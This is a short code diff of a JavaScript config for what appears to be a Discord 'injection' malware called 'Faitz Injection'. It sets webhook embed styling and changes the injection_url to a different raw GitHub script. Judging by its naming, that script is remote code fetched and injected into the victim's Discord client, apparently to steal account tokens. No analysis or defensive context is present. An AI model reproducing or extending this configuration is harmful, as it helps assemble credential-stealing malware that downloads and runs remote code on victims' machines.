@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Faitz Injection', 
   embed_icon: 'https://media.tenor.com/H2kSVw4FMXYAAAAd/gangsta-guns.gifhttps://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Faitz0002/Inject/main/index1.js', 
+  injection_url: 'https://raw.githubusercontent.com/Faitz0002/daddy/main/index.js', 
   /**
    
    **/
